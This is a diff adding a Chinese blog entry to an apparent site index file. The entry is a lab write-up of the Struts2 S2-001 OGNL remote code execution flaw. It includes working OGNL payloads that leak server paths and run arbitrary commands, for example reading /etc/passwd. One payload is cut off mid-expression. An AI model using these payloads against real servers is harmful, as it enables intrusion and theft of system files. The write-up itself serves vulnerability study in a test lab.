@@ -23,6 +23,25 @@
     
     
     <entry>
+      <title>struts2-001 远程代码执行漏洞</title>
+      <link href="/2020/08/15/struts2-001/"/>
+      <url>/2020/08/15/struts2-001/</url>
+      
+        <content type="html"><![CDATA[<h1 id="struts2-001-远程代码执行漏洞"><a href="#struts2-001-远程代码执行漏洞" class="headerlink" title="struts2-001 远程代码执行漏洞"></a>struts2-001 远程代码执行漏洞</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行</p><h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>启动测试环境。<a href="http://192.168.200.130:8080/" target="_blank" rel="noopener">http://192.168.200.130:8080/</a></p><pre><code>docker-compose builddocker-compose up -d</code></pre><p><img src="https://s1.ax1x.com/2020/08/15/dFONdA.png" alt="dFONdA.png"></p><h2 id="POC-amp-amp-EXP"><a href="#POC-amp-amp-EXP" class="headerlink" title="POC &amp;&amp; EXP"></a>POC &amp;&amp; EXP</h2><p>获取tomcat执行路径：</p><pre><code>%{&quot;tomcatBinDir{&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;}&quot;}</code></pre><p>获取Web路径：</p><p>%{井号req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(“com.opensymphony.xwork2.dispatcher.HttpServletResponse”).getWriter(),#response.println(#req.getRealPath(‘/‘)),#response.flush(),#response.close()}</p><blockquote><p>查了一下，<code>{井号</code> 是 nunjucks 的注释标记， <a href="http://mozilla.github.io/nunjucks/templating.html#comments。" target="_blank" rel="noopener">http://mozilla.github.io/nunjucks/templating.html#comments。</a></p><p>所以只有半个的话，就挂了。</p><p>所以解决办法是 <code>{#</code> 但是这样 post 内容就不是纯的 markdown 了。</p><p>经过实际测试确实是因为 # 导致的。</p></blockquote><p>任意命令执行:（命令加参数：<code>new java.lang.String[]{&quot;cat&quot;,&quot;/etc/passwd&quot;}</code>）</p><p>将<code>new java.lang.String[]{&quot;pwd&quot;})</code>中的<code>pwd</code>替换为对应的命令，即可执行。</p><p>%{井号a=(new java.lang.ProcessBuilder(new java.lang.String[]{“pwd”})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(</p><p>再password处输入：</p><p>%{井号a=(new java.lang.ProcessBuilder(new java.lang.String[]{“cat”,”/etc/passwd”})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(“com.opensymphony.xwork2.dispatcher.HttpServletResponse”),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}</p><p><img src="https://s1.ax1x.com/2020/08/15/dFOdit.png" alt="dFOdit.png"></p><p>bp抓包看请求包信息</p><p><img src="https://s1.ax1x.com/2020/08/15/dFO0Rf.png" alt="dFO0Rf.png"></p><p>完。</p><p>参考资料：<a href="https://chybeta.github.io/2018/02/06/[struts2-命令-代码执行漏洞分析系列]S2-001/" target="_blank" rel="noopener">https://chybeta.github.io/2018/02/06/[struts2-命令-代码执行漏洞分析系列]S2-001/</a></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> struts </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Redis 4.x/5.x 未授权访问漏洞</title>
       <link href="/2020/08/15/Redis/"/>
       <url>/2020/08/15/Redis/</url>
